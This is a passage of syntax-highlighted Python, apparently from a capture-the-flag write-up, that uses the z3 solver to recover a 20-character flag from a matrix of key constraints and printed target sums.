class="number">1</span>][<span class="number">0</span>] == <span class="number">212</span>, key[<span class="number">1</span>][<span class="number">1</span>] == <span class="number">148</span>, key[<span class="number">1</span>][<span class="number">2</span>] == <span class="number">17</span>, key[<span class="number">1</span>][<span class="number">3</span>] == <span class="number">74</span>, key[<span class="number">1</span>][<span class="number">4</span>] == <span class="number">87</span>, key[<span class="number">1</span>][<span class="number">5</span>] == <span class="number">253</span>, key[<span class="number">1</span>][<span class="number">6</span>] == <span class="number">250</span>, key[<span class="number">1</span>][<span class="number">7</span>] == <span class="number">136</span>, key[<span class="number">1</span>][<span class="number">8</span>] == <span class="number">89</span>, key[<span class="number">1</span>][<span class="number">9</span>] == <span class="number">211</span>, key[<span class="number">1</span>][<span class="number">10</span>] == <span class="number">49</span>, key[<span class="number">1</span>][<span class="number">11</span>] == <span class="number">26</span>, key[<span class="number">1</span>][<span class="number">12</span>] == <span class="number">115</span>, key[<span class="number">1</span>][<span class="number">13</span>] == <span class="number">88</span>, key[<span class="number">1</span>][<span class="number">14</span>] == <span class="number">181</span>, key[<span class="number">1</span>][<span class="number">15</span>] == <span class="number">195</span>, key[<span class="number">1</span>][<span class="number">16</span>] == <span class="number">237</span>, key[<span class="number">1</span>][<span class="number">17</span>] == <span class="number">10</span>, key[<span class="number">1</span>][<span class="number">18</span>] == <span class="number">119</span>, key[<span class="number">1</span>][<span class="number">19</span>] == <span class="number">121</span>, </span><br><span class="line">key[<span class="number">2</span>][<span class="number">0</span>] == <span class="number">229</span>, key[<span class="number">2</span>][<span class="number">1</span>] == <span class="number">172</span>, key[<span class="number">2</span>][<span class="number">2</span>] == <span class="number">230</span>, key[<span class="number">2</span>][<span class="number">3</span>] == <span class="number">123</span>, key[<span class="number">2</span>][<span class="number">4</span>] == <span class="number">245</span>, key[<span class="number">2</span>][<span class="number">5</span>] == <span class="number">127</span>, key[<span class="number">2</span>][<span class="number">6</span>] == <span class="number">119</span>, key[<span class="number">2</span>][<span class="number">7</span>] == <span class="number">157</span>, key[<span class="number">2</span>][<span class="number">8</span>] == <span class="number">208</span>, key[<span class="number">2</span>][<span class="number">9</span>] == <span class="number">159</span>, key[<span class="number">2</span>][<span class="number">10</span>] == <span class="number">37</span>, key[<span class="number">2</span>][<span class="number">11</span>] == <span class="number">32</span>, key[<span class="number">2</span>][<span class="number">12</span>] == <span class="number">5</span>, key[<span class="number">2</span>][<span class="number">13</span>] == <span class="number">207</span>, key[<span class="number">2</span>][<span class="number">14</span>] == <span class="number">145</span>, key[<span class="number">2</span>][<span class="number">15</span>] == <span class="number">75</span>, key[<span class="number">2</span>][<span class="number">16</span>] == <span class="number">251</span>, key[<span class="number">2</span>][<span class="number">17</span>] == <span class="number">60</span>, key[<span class="number">2</span>][<span class="number">18</span>] == <span class="number">135</span>, key[<span class="number">2</span>][<span class="number">19</span>] == <span class="number">125</span>, </span><br><span class="line">key[<span class="number">3</span>][<span class="number">0</span>] == <span class="number">181</span>, key[<span class="number">3</span>][<span class="number">1</span>] == <span class="number">83</span>, key[<span class="number">3</span>][<span class="number">2</span>] == <span class="number">66</span>, key[<span class="number">3</span>][<span class="number">3</span>] == <span class="number">43</span>, key[<span class="number">3</span>][<span class="number">4</span>] == <span class="number">85</span>, key[<span class="number">3</span>][<span class="number">5</span>] == <span class="number">198</span>, key[<span class="number">3</span>][<span class="number">6</span>] == <span class="number">89</span>, key[<span class="number">3</span>][<span class="number">7</span>] == <span class="number">205</span>, key[<span class="number">3</span>][<span class="number">8</span>] == <span class="number">114</span>, key[<span class="number">3</span>][<span class="number">9</span>] == <span class="number">221</span>, key[<span class="number">3</span>][<span class="number">10</span>] == <span class="number">105</span>, key[<span class="number">3</span>][<span class="number">11</span>] == <span class="number">145</span>, key[<span class="number">3</span>][<span class="number">12</span>] == <span class="number">155</span>, key[<span class="number">3</span>][<span class="number">13</span>] == <span class="number">91</span>, key[<span class="number">3</span>][<span class="number">14</span>] == <span class="number">123</span>, key[<span class="number">3</span>][<span class="number">15</span>] == <span class="number">48</span>, key[<span class="number">3</span>][<span class="number">16</span>] == <span class="number">76</span>, key[<span class="number">3</span>][<span class="number">17</span>] == <span class="number">64</span>, key[<span class="number">3</span>][<span class="number">18</span>] == <span class="number">141</span>, key[<span class="number">3</span>][<span class="number">19</span>] == <span class="number">22</span>, </span><br><span class="line">key[<span class="number">4</span>][<span class="number">0</span>] == <span class="number">211</span>, key[<span class="number">4</span>][<span class="number">1</span>] == <span class="number">225</span>, key[<span class="number">4</span>][<span class="number">2</span>] == <span class="number">204</span>, key[<span class="number">4</span>][<span class="number">3</span>] == <span class="number">55</span>, key[<span class="number">4</span>][<span class="number">4</span>] == <span class="number">107</span>, key[<span class="number">4</span>][<span class="number">5</span>] == <span class="number">76</span>, key[<span class="number">4</span>][<span class="number">6</span>] == <span class="number">7</span>, key[<span class="number">4</span>][<span class="number">7</span>] == <span class="number">39</span>, key[<span class="number">4</span>][<span class="number">8</span>] == <span class="number">199</span>, key[<span class="number">4</span>][<span class="number">9</span>] == <span class="number">84</span>, key[<span class="number">4</span>][<span class="number">10</span>] == <span class="number">167</span>, key[<span class="number">4</span>][<span class="number">11</span>] == <span class="number">62</span>, key[<span class="number">4</span>][<span class="number">12</span>] == <span class="number">219</span>, key[<span class="number">4</span>][<span class="number">13</span>] == <span class="number">54</span>, key[<span class="number">4</span>][<span class="number">14</span>] == <span class="number">6</span>, key[<span class="number">4</span>][<span class="number">15</span>] == <span class="number">144</span>, key[<span class="number">4</span>][<span class="number">16</span>] == <span class="number">55</span>, key[<span class="number">4</span>][<span class="number">17</span>] == <span class="number">98</span>, key[<span class="number">4</span>][<span class="number">18</span>] == <span class="number">186</span>, key[<span class="number">4</span>][<span class="number">19</span>] == <span class="number">116</span>, </span><br><span class="line">key[<span class="number">5</span>][<span class="number">0</span>] == <span class="number">149</span>, key[<span class="number">5</span>][<span class="number">1</span>] == <span class="number">163</span>, key[<span class="number">5</span>][<span class="number">2</span>] == <span class="number">127</span>, key[<span class="number">5</span>][<span class="number">3</span>] == <span class="number">186</span>, key[<span class="number">5</span>][<span class="number">4</span>] == <span class="number">46</span>, key[<span class="number">5</span>][<span class="number">5</span>] == <span class="number">118</span>, key[<span class="number">5</span>][<span class="number">6</span>] == <span class="number">247</span>, key[<span class="number">5</span>][<span class="number">7</span>] == <span class="number">194</span>, key[<span class="number">5</span>][<span class="number">8</span>] == <span class="number">9</span>, key[<span class="number">5</span>][<span class="number">9</span>] == <span class="number">165</span>, key[<span class="number">5</span>][<span class="number">10</span>] == <span class="number">169</span>, key[<span class="number">5</span>][<span class="number">11</span>] == <span class="number">224</span>, key[<span class="number">5</span>][<span class="number">12</span>] == <span class="number">68</span>, key[<span class="number">5</span>][<span class="number">13</span>] == <span class="number">129</span>, key[<span class="number">5</span>][<span class="number">14</span>] == <span class="number">54</span>, key[<span class="number">5</span>][<span class="number">15</span>] == <span class="number">15</span>, key[<span class="number">5</span>][<span class="number">16</span>] == <span class="number">134</span>, key[<span class="number">5</span>][<span class="number">17</span>] == <span class="number">39</span>, key[<span class="number">5</span>][<span class="number">18</span>] == <span class="number">185</span>, key[<span class="number">5</span>][<span class="number">19</span>] == <span class="number">248</span>, </span><br><span class="line">key[<span class="number">6</span>][<span class="number">0</span>] == <span class="number">245</span>, key[<span class="number">6</span>][<span class="number">1</span>] == <span class="number">159</span>, key[<span class="number">6</span>][<span class="number">2</span>] == <span class="number">64</span>, key[<span class="number">6</span>][<span class="number">3</span>] == <span class="number">241</span>, key[<span class="number">6</span>][<span class="number">4</span>] == <span class="number">163</span>, key[<span class="number">6</span>][<span class="number">5</span>] == <span class="number">116</span>, key[<span class="number">6</span>][<span class="number">6</span>] == <span class="number">4</span>, key[<span class="number">6</span>][<span class="number">7</span>] == <span class="number">15</span>, key[<span class="number">6</span>][<span class="number">8</span>] == <span class="number">126</span>, key[<span class="number">6</span>][<span class="number">9</span>] == <span class="number">170</span>, key[<span class="number">6</span>][<span class="number">10</span>] == <span class="number">10</span>, key[<span class="number">6</span>][<span class="number">11</span>] == <span class="number">110</span>, key[<span class="number">6</span>][<span class="number">12</span>] == <span class="number">251</span>, key[<span class="number">6</span>][<span class="number">13</span>] == <span class="number">169</span>, key[<span class="number">6</span>][<span class="number">14</span>] == <span class="number">252</span>, key[<span class="number">6</span>][<span class="number">15</span>] == <span class="number">99</span>, key[<span class="number">6</span>][<span class="number">16</span>] == <span class="number">199</span>, key[<span class="number">6</span>][<span class="number">17</span>] == <span class="number">188</span>, key[<span class="number">6</span>][<span class="number">18</span>] == <span class="number">149</span>, key[<span class="number">6</span>][<span class="number">19</span>] == <span class="number">72</span>, </span><br><span class="line">key[<span class="number">7</span>][<span class="number">0</span>] == <span class="number">233</span>, key[<span class="number">7</span>][<span class="number">1</span>] == <span class="number">38</span>, key[<span class="number">7</span>][<span class="number">2</span>] == <span class="number">197</span>, key[<span class="number">7</span>][<span class="number">3</span>] == <span class="number">105</span>, key[<span class="number">7</span>][<span class="number">4</span>] == <span class="number">202</span>, key[<span class="number">7</span>][<span class="number">5</span>] == <span class="number">2</span>, key[<span class="number">7</span>][<span class="number">6</span>] == <span class="number">22</span>, key[<span class="number">7</span>][<span class="number">7</span>] == <span class="number">225</span>, key[<span class="number">7</span>][<span class="number">8</span>] == <span class="number">189</span>, key[<span class="number">7</span>][<span class="number">9</span>] == <span class="number">166</span>, key[<span class="number">7</span>][<span class="number">10</span>] == <span class="number">239</span>, key[<span class="number">7</span>][<span class="number">11</span>] == <span class="number">220</span>, key[<span class="number">7</span>][<span class="number">12</span>] == <span class="number">70</span>, key[<span class="number">7</span>][<span class="number">13</span>] == <span class="number">98</span>, key[<span class="number">7</span>][<span class="number">14</span>] == <span class="number">194</span>, key[<span class="number">7</span>][<span class="number">15</span>] == <span class="number">129</span>, key[<span class="number">7</span>][<span class="number">16</span>] == <span class="number">27</span>, key[<span class="number">7</span>][<span class="number">17</span>] == <span class="number">236</span>, key[<span class="number">7</span>][<span class="number">18</span>] == <span class="number">159</span>, key[<span class="number">7</span>][<span class="number">19</span>] == <span class="number">62</span>, </span><br><span class="line">key[<span class="number">8</span>][<span class="number">0</span>] == <span class="number">152</span>, key[<span class="number">8</span>][<span class="number">1</span>] == <span class="number">67</span>, key[<span class="number">8</span>][<span class="number">2</span>] == <span class="number">72</span>, key[<span class="number">8</span>][<span class="number">3</span>] == <span class="number">35</span>, key[<span class="number">8</span>][<span class="number">4</span>] == <span class="number">12</span>, key[<span class="number">8</span>][<span class="number">5</span>] == <span class="number">55</span>, key[<span class="number">8</span>][<span class="number">6</span>] == <span class="number">139</span>, key[<span class="number">8</span>][<span class="number">7</span>] == <span class="number">4</span>, key[<span class="number">8</span>][<span class="number">8</span>] == <span class="number">169</span>, key[<span class="number">8</span>][<span class="number">9</span>] == <span class="number">142</span>, key[<span class="number">8</span>][<span class="number">10</span>] == <span class="number">135</span>, key[<span class="number">8</span>][<span class="number">11</span>] == <span class="number">122</span>, key[<span class="number">8</span>][<span class="number">12</span>] == <span class="number">3</span>, key[<span class="number">8</span>][<span class="number">13</span>] == <span class="number">166</span>, key[<span class="number">8</span>][<span class="number">14</span>] == <span class="number">139</span>, key[<span class="number">8</span>][<span class="number">15</span>] == <span class="number">62</span>, key[<span class="number">8</span>][<span class="number">16</span>] == <span class="number">23</span>, key[<span class="number">8</span>][<span class="number">17</span>] == <span class="number">92</span>, key[<span class="number">8</span>][<span class="number">18</span>] == <span class="number">11</span>, key[<span class="number">8</span>][<span class="number">19</span>] == <span class="number">136</span>, </span><br><span class="line">key[<span class="number">9</span>][<span class="number">0</span>] == <span class="number">96</span>, key[<span class="number">9</span>][<span class="number">1</span>] == <span class="number">141</span>, key[<span class="number">9</span>][<span class="number">2</span>] == <span class="number">38</span>, key[<span class="number">9</span>][<span class="number">3</span>] == <span class="number">124</span>, key[<span class="number">9</span>][<span class="number">4</span>] == <span class="number">139</span>, key[<span class="number">9</span>][<span class="number">5</span>] == <span class="number">43</span>, key[<span class="number">9</span>][<span class="number">6</span>] == <span class="number">15</span>, key[<span class="number">9</span>][<span class="number">7</span>] == <span class="number">119</span>, key[<span class="number">9</span>][<span class="number">8</span>] == <span class="number">30</span>, key[<span class="number">9</span>][<span class="number">9</span>] == <span class="number">252</span>, key[<span class="number">9</span>][<span class="number">10</span>] == <span class="number">255</span>, key[<span class="number">9</span>][<span class="number">11</span>] == <span class="number">123</span>, key[<span class="number">9</span>][<span class="number">12</span>] == <span class="number">223</span>, key[<span class="number">9</span>][<span class="number">13</span>] == <span class="number">200</span>, key[<span class="number">9</span>][<span class="number">14</span>] == <span class="number">21</span>, key[<span class="number">9</span>][<span class="number">15</span>] == <span class="number">117</span>, key[<span class="number">9</span>][<span class="number">16</span>] == <span class="number">231</span>, key[<span class="number">9</span>][<span class="number">17</span>] == <span class="number">9</span>, key[<span class="number">9</span>][<span class="number">18</span>] == <span class="number">239</span>, key[<span class="number">9</span>][<span class="number">19</span>] == <span class="number">222</span>, </span><br><span class="line">key[<span class="number">10</span>][<span class="number">0</span>] == <span class="number">249</span>, key[<span class="number">10</span>][<span class="number">1</span>] == <span class="number">91</span>, key[<span class="number">10</span>][<span class="number">2</span>] == <span class="number">66</span>, key[<span class="number">10</span>][<span class="number">3</span>] == <span class="number">21</span>, key[<span class="number">10</span>][<span class="number">4</span>] == <span class="number">121</span>, key[<span class="number">10</span>][<span class="number">5</span>] == <span class="number">146</span>, key[<span class="number">10</span>][<span class="number">6</span>] == <span class="number">5</span>, key[<span class="number">10</span>][<span class="number">7</span>] == <span class="number">180</span>, key[<span class="number">10</span>][<span class="number">8</span>] == <span class="number">6</span>, key[<span class="number">10</span>][<span class="number">9</span>] == <span class="number">80</span>, key[<span class="number">10</span>][<span class="number">10</span>] == <span class="number">112</span>, key[<span class="number">10</span>][<span class="number">11</span>] == <span class="number">255</span>, key[<span class="number">10</span>][<span class="number">12</span>] == <span class="number">239</span>, key[<span class="number">10</span>][<span class="number">13</span>] == <span class="number">17</span>, key[<span class="number">10</span>][<span class="number">14</span>] == <span class="number">39</span>, key[<span class="number">10</span>][<span class="number">15</span>] == <span class="number">254</span>, key[<span class="number">10</span>][<span class="number">16</span>] == <span class="number">153</span>, key[<span class="number">10</span>][<span class="number">17</span>] == <span class="number">118</span>, key[<span class="number">10</span>][<span class="number">18</span>] == <span class="number">47</span>, key[<span class="number">10</span>][<span class="number">19</span>] == <span class="number">217</span>, </span><br><span class="line">key[<span class="number">11</span>][<span class="number">0</span>] == <span class="number">84</span>, key[<span class="number">11</span>][<span class="number">1</span>] == <span class="number">96</span>, key[<span class="number">11</span>][<span class="number">2</span>] == <span class="number">190</span>, key[<span class="number">11</span>][<span class="number">3</span>] == <span class="number">188</span>, key[<span class="number">11</span>][<span class="number">4</span>] == <span class="number">255</span>, key[<span class="number">11</span>][<span class="number">5</span>] == <span class="number">181</span>, key[<span class="number">11</span>][<span class="number">6</span>] == <span class="number">188</span>, key[<span class="number">11</span>][<span class="number">7</span>] == <span class="number">124</span>, key[<span class="number">11</span>][<span class="number">8</span>] == <span class="number">47</span>, key[<span class="number">11</span>][<span class="number">9</span>] == <span class="number">70</span>, key[<span class="number">11</span>][<span class="number">10</span>] == <span class="number">201</span>, key[<span class="number">11</span>][<span class="number">11</span>] == <span class="number">160</span>, key[<span class="number">11</span>][<span class="number">12</span>] == <span class="number">126</span>, key[<span class="number">11</span>][<span class="number">13</span>] == <span class="number">210</span>, key[<span class="number">11</span>][<span class="number">14</span>] == <span class="number">236</span>, key[<span class="number">11</span>][<span class="number">15</span>] == <span class="number">22</span>, key[<span class="number">11</span>][<span class="number">16</span>] == <span class="number">120</span>, key[<span class="number">11</span>][<span class="number">17</span>] == <span class="number">181</span>, key[<span class="number">11</span>][<span class="number">18</span>] == <span class="number">197</span>, key[<span class="number">11</span>][<span class="number">19</span>] == <span class="number">69</span>, </span><br><span class="line">key[<span class="number">12</span>][<span class="number">0</span>] == <span class="number">51</span>, key[<span class="number">12</span>][<span class="number">1</span>] == <span class="number">173</span>, key[<span class="number">12</span>][<span class="number">2</span>] == <span class="number">216</span>, key[<span class="number">12</span>][<span class="number">3</span>] == <span class="number">143</span>, key[<span class="number">12</span>][<span class="number">4</span>] == <span class="number">41</span>, key[<span class="number">12</span>][<span class="number">5</span>] == <span class="number">174</span>, key[<span class="number">12</span>][<span class="number">6</span>] == <span class="number">184</span>, key[<span class="number">12</span>][<span class="number">7</span>] == <span class="number">189</span>, key[<span class="number">12</span>][<span class="number">8</span>] == <span class="number">111</span>, key[<span class="number">12</span>][<span class="number">9</span>] == <span class="number">133</span>, key[<span class="number">12</span>][<span class="number">10</span>] == <span class="number">79</span>, key[<span class="number">12</span>][<span class="number">11</span>] == <span class="number">36</span>, key[<span class="number">12</span>][<span class="number">12</span>] == <span class="number">99</span>, key[<span class="number">12</span>][<span class="number">13</span>] == <span class="number">140</span>, key[<span class="number">12</span>][<span class="number">14</span>] == <span class="number">120</span>, key[<span class="number">12</span>][<span class="number">15</span>] == <span class="number">144</span>, key[<span class="number">12</span>][<span class="number">16</span>] == <span class="number">80</span>, key[<span class="number">12</span>][<span class="number">17</span>] == <span class="number">231</span>, key[<span class="number">12</span>][<span class="number">18</span>] == <span class="number">187</span>, key[<span class="number">12</span>][<span class="number">19</span>] == <span class="number">107</span>, </span><br><span class="line">key[<span class="number">13</span>][<span class="number">0</span>] == <span class="number">173</span>, key[<span class="number">13</span>][<span class="number">1</span>] == <span class="number">39</span>, key[<span class="number">13</span>][<span class="number">2</span>] == <span class="number">151</span>, key[<span class="number">13</span>][<span class="number">3</span>] == <span class="number">161</span>, key[<span class="number">13</span>][<span class="number">4</span>] == <span class="number">139</span>, key[<span class="number">13</span>][<span class="number">5</span>] == <span class="number">233</span>, key[<span class="number">13</span>][<span class="number">6</span>] == <span class="number">143</span>, key[<span class="number">13</span>][<span class="number">7</span>] == <span class="number">205</span>, key[<span class="number">13</span>][<span class="number">8</span>] == <span class="number">170</span>, key[<span class="number">13</span>][<span class="number">9</span>] == <span class="number">125</span>, key[<span class="number">13</span>][<span class="number">10</span>] == <span class="number">209</span>, key[<span class="number">13</span>][<span class="number">11</span>] == <span class="number">54</span>, key[<span class="number">13</span>][<span class="number">12</span>] == <span class="number">128</span>, key[<span class="number">13</span>][<span class="number">13</span>] == <span class="number">134</span>, key[<span class="number">13</span>][<span class="number">14</span>] == <span class="number">55</span>, key[<span class="number">13</span>][<span class="number">15</span>] == <span class="number">246</span>, key[<span class="number">13</span>][<span class="number">16</span>] == <span class="number">157</span>, key[<span class="number">13</span>][<span class="number">17</span>] == <span class="number">57</span>, key[<span class="number">13</span>][<span class="number">18</span>] == <span class="number">42</span>, key[<span class="number">13</span>][<span class="number">19</span>] == <span class="number">195</span>, </span><br><span class="line">key[<span class="number">14</span>][<span class="number">0</span>] == <span class="number">5</span>, key[<span class="number">14</span>][<span class="number">1</span>] == <span class="number">49</span>, key[<span class="number">14</span>][<span class="number">2</span>] == <span class="number">235</span>, key[<span class="number">14</span>][<span class="number">3</span>] == <span class="number">8</span>, key[<span class="number">14</span>][<span class="number">4</span>] == <span class="number">84</span>, key[<span class="number">14</span>][<span class="number">5</span>] == <span class="number">9</span>, key[<span class="number">14</span>][<span class="number">6</span>] == <span class="number">219</span>, key[<span class="number">14</span>][<span class="number">7</span>] == <span class="number">90</span>, key[<span class="number">14</span>][<span class="number">8</span>] == <span class="number">109</span>, key[<span class="number">14</span>][<span class="number">9</span>] == <span class="number">164</span>, key[<span class="number">14</span>][<span class="number">10</span>] == <span class="number">38</span>, key[<span class="number">14</span>][<span class="number">11</span>] == <span class="number">159</span>, key[<span class="number">14</span>][<span class="number">12</span>] == <span class="number">218</span>, key[<span class="number">14</span>][<span class="number">13</span>] == <span class="number">214</span>, key[<span class="number">14</span>][<span class="number">14</span>] == <span class="number">22</span>, key[<span class="number">14</span>][<span class="number">15</span>] == <span class="number">205</span>, key[<span class="number">14</span>][<span class="number">16</span>] == <span class="number">7</span>, key[<span class="number">14</span>][<span class="number">17</span>] == <span class="number">57</span>, key[<span class="number">14</span>][<span class="number">18</span>] == <span class="number">210</span>, key[<span class="number">14</span>][<span class="number">19</span>] == <span class="number">131</span>, </span><br><span class="line">key[<span class="number">15</span>][<span class="number">0</span>] == <span class="number">107</span>, key[<span class="number">15</span>][<span class="number">1</span>] == <span class="number">67</span>, key[<span class="number">15</span>][<span class="number">2</span>] == <span class="number">107</span>, key[<span class="number">15</span>][<span class="number">3</span>] == <span class="number">141</span>, key[<span class="number">15</span>][<span class="number">4</span>] == <span class="number">129</span>, key[<span class="number">15</span>][<span class="number">5</span>] == <span class="number">250</span>, key[<span class="number">15</span>][<span class="number">6</span>] == <span class="number">97</span>, key[<span class="number">15</span>][<span class="number">7</span>] == <span class="number">3</span>, key[<span class="number">15</span>][<span class="number">8</span>] == <span class="number">26</span>, key[<span class="number">15</span>][<span class="number">9</span>] == <span class="number">215</span>, key[<span class="number">15</span>][<span class="number">10</span>] == <span class="number">119</span>, key[<span class="number">15</span>][<span class="number">11</span>] == <span class="number">213</span>, key[<span class="number">15</span>][<span class="number">12</span>] == <span class="number">255</span>, key[<span class="number">15</span>][<span class="number">13</span>] == <span class="number">183</span>, key[<span class="number">15</span>][<span class="number">14</span>] == <span class="number">229</span>, key[<span class="number">15</span>][<span class="number">15</span>] == <span class="number">1</span>, key[<span class="number">15</span>][<span class="number">16</span>] == <span class="number">27</span>, key[<span class="number">15</span>][<span class="number">17</span>] == <span class="number">9</span>, key[<span class="number">15</span>][<span class="number">18</span>] == <span class="number">88</span>, key[<span class="number">15</span>][<span class="number">19</span>] == <span class="number">59</span>, </span><br><span class="line">key[<span class="number">16</span>][<span class="number">0</span>] == <span class="number">57</span>, key[<span class="number">16</span>][<span class="number">1</span>] == <span class="number">72</span>, key[<span class="number">16</span>][<span class="number">2</span>] == <span class="number">91</span>, key[<span class="number">16</span>][<span class="number">3</span>] == <span class="number">96</span>, key[<span class="number">16</span>][<span class="number">4</span>] == <span class="number">125</span>, key[<span class="number">16</span>][<span class="number">5</span>] == <span class="number">105</span>, key[<span class="number">16</span>][<span class="number">6</span>] == <span class="number">94</span>, key[<span class="number">16</span>][<span class="number">7</span>] == <span class="number">235</span>, key[<span class="number">16</span>][<span class="number">8</span>] == <span class="number">138</span>, key[<span class="number">16</span>][<span class="number">9</span>] == <span class="number">39</span>, key[<span class="number">16</span>][<span class="number">10</span>] == <span class="number">145</span>, key[<span class="number">16</span>][<span class="number">11</span>] == <span class="number">130</span>, key[<span class="number">16</span>][<span class="number">12</span>] == <span class="number">126</span>, key[<span class="number">16</span>][<span class="number">13</span>] == <span class="number">147</span>, key[<span class="number">16</span>][<span class="number">14</span>] == <span class="number">254</span>, key[<span class="number">16</span>][<span class="number">15</span>] == <span class="number">179</span>, key[<span class="number">16</span>][<span class="number">16</span>] == <span class="number">181</span>, key[<span class="number">16</span>][<span class="number">17</span>] == <span class="number">183</span>, key[<span class="number">16</span>][<span class="number">18</span>] == <span class="number">216</span>, key[<span class="number">16</span>][<span class="number">19</span>] == <span class="number">211</span>, </span><br><span class="line">key[<span class="number">17</span>][<span class="number">0</span>] == <span class="number">164</span>, key[<span class="number">17</span>][<span class="number">1</span>] == <span class="number">205</span>, key[<span class="number">17</span>][<span class="number">2</span>] == <span class="number">28</span>, key[<span class="number">17</span>][<span class="number">3</span>] == <span class="number">160</span>, key[<span class="number">17</span>][<span class="number">4</span>] == <span class="number">233</span>, key[<span class="number">17</span>][<span class="number">5</span>] == <span class="number">70</span>, key[<span class="number">17</span>][<span class="number">6</span>] == <span class="number">109</span>, key[<span class="number">17</span>][<span class="number">7</span>] == <span class="number">51</span>, key[<span class="number">17</span>][<span class="number">8</span>] == <span class="number">0</span>, key[<span class="number">17</span>][<span class="number">9</span>] == <span class="number">71</span>, key[<span class="number">17</span>][<span class="number">10</span>] == <span class="number">99</span>, key[<span class="number">17</span>][<span class="number">11</span>] == <span class="number">163</span>, key[<span class="number">17</span>][<span class="number">12</span>] == <span class="number">37</span>, key[<span class="number">17</span>][<span class="number">13</span>] == <span class="number">98</span>, key[<span class="number">17</span>][<span class="number">14</span>] == <span class="number">46</span>, key[<span class="number">17</span>][<span class="number">15</span>] == <span class="number">44</span>, key[<span class="number">17</span>][<span class="number">16</span>] == <span class="number">138</span>, key[<span class="number">17</span>][<span class="number">17</span>] == <span class="number">135</span>, key[<span class="number">17</span>][<span class="number">18</span>] == <span class="number">191</span>, key[<span class="number">17</span>][<span class="number">19</span>] == <span class="number">144</span>, </span><br><span class="line">key[<span class="number">18</span>][<span class="number">0</span>] == <span class="number">13</span>, key[<span class="number">18</span>][<span class="number">1</span>] == <span class="number">240</span>, key[<span class="number">18</span>][<span class="number">2</span>] == <span class="number">143</span>, key[<span class="number">18</span>][<span class="number">3</span>] == <span class="number">53</span>, key[<span class="number">18</span>][<span class="number">4</span>] == <span class="number">75</span>, key[<span class="number">18</span>][<span class="number">5</span>] == <span class="number">23</span>, key[<span class="number">18</span>][<span class="number">6</span>] == <span class="number">26</span>, key[<span class="number">18</span>][<span class="number">7</span>] == <span class="number">224</span>, key[<span class="number">18</span>][<span class="number">8</span>] == <span class="number">31</span>, key[<span class="number">18</span>][<span class="number">9</span>] == <span class="number">199</span>, key[<span class="number">18</span>][<span class="number">10</span>] == <span class="number">182</span>, key[<span class="number">18</span>][<span class="number">11</span>] == <span class="number">220</span>, key[<span class="number">18</span>][<span class="number">12</span>] == <span class="number">130</span>, key[<span class="number">18</span>][<span class="number">13</span>] == <span class="number">61</span>, key[<span class="number">18</span>][<span class="number">14</span>] == <span class="number">170</span>, key[<span class="number">18</span>][<span class="number">15</span>] == <span class="number">130</span>, key[<span class="number">18</span>][<span class="number">16</span>] == <span class="number">253</span>, key[<span class="number">18</span>][<span class="number">17</span>] == <span class="number">240</span>, key[<span class="number">18</span>][<span class="number">18</span>] == <span class="number">182</span>, key[<span class="number">18</span>][<span class="number">19</span>] == <span class="number">9</span>, </span><br><span class="line">key[<span class="number">19</span>][<span class="number">0</span>] == <span class="number">245</span>, key[<span class="number">19</span>][<span class="number">1</span>] == <span class="number">96</span>, key[<span class="number">19</span>][<span class="number">2</span>] == <span class="number">170</span>, key[<span class="number">19</span>][<span class="number">3</span>] == <span class="number">79</span>, key[<span class="number">19</span>][<span class="number">4</span>] == <span class="number">249</span>, key[<span class="number">19</span>][<span class="number">5</span>] == <span class="number">16</span>, key[<span class="number">19</span>][<span class="number">6</span>] == <span class="number">121</span>, key[<span class="number">19</span>][<span class="number">7</span>] == <span class="number">6</span>, key[<span class="number">19</span>][<span class="number">8</span>] == <span class="number">7</span>, key[<span class="number">19</span>][<span class="number">9</span>] == <span class="number">69</span>, key[<span class="number">19</span>][<span class="number">10</span>] == <span class="number">212</span>, key[<span class="number">19</span>][<span class="number">11</span>] == <span class="number">133</span>, key[<span class="number">19</span>][<span class="number">12</span>] == <span class="number">52</span>, key[<span class="number">19</span>][<span class="number">13</span>] == <span class="number">20</span>, key[<span class="number">19</span>][<span class="number">14</span>] == <span class="number">225</span>, key[<span class="number">19</span>][<span class="number">15</span>] == <span class="number">102</span>, key[<span class="number">19</span>][<span class="number">16</span>] == <span class="number">228</span>, key[<span class="number">19</span>][<span class="number">17</span>] == <span class="number">121</span>, key[<span class="number">19</span>][<span class="number">18</span>] == <span class="number">56</span>, key[<span class="number">19</span>][<span class="number">19</span>] == <span class="number">208</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="built_in">sum</span>[i] += flag[j] * key[i][j]</span><br><span class="line">s.add(<span class="built_in">sum</span>[<span class="number">0</span>] == <span class="number">217114</span>, <span class="built_in">sum</span>[<span class="number">1</span>] == <span class="number">270581</span>, <span class="built_in">sum</span>[<span class="number">2</span>] == <span class="number">291585</span>, <span class="built_in">sum</span>[<span class="number">3</span>] == <span class="number">234325</span>, <span class="built_in">sum</span>[<span class="number">4</span>] == <span class="number">240502</span>, <span class="built_in">sum</span>[<span class="number">5</span>] == <span class="number">277604</span>, <span class="built_in">sum</span>[<span class="number">6</span>] == <span class="number">286168</span>, <span class="built_in">sum</span>[<span class="number">7</span>] == <span class="number">290450</span>, <span class="built_in">sum</span>[<span class="number">8</span>] == <span class="number">179355</span>, <span class="built_in">sum</span>[<span class="number">9</span>] == <span class="number">272487</span>, <span class="built_in">sum</span>[<span class="number">10</span>] == <span class="number">249816</span>, <span class="built_in">sum</span>[<span class="number">11</span>] == <span class="number">305636</span>, <span class="built_in">sum</span>[<span class="number">12</span>] == <span class="number">276217</span>, <span class="built_in">sum</span>[<span class="number">13</span>] == <span class="number">294166</span>, <span class="built_in">sum</span>[<span class="number">14</span>] == <span class="number">237236</span>, <span class="built_in">sum</span>[<span class="number">15</span>] == <span class="number">242008</span>, <span class="built_in">sum</span>[<span class="number">16</span>] == <span class="number">289929</span>, <span class="built_in">sum</span>[<span class="number">17</span>] == <span class="number">221788</span>, <span class="built_in">sum</span>[<span class="number">18</span>] == <span class="number">268459</span>, <span class="built_in">sum</span>[<span class="number">19</span>] == <span class="number">247407</span>)</span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(m[flag[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>)]))</span><br><span class="line">    <span class="comment"># 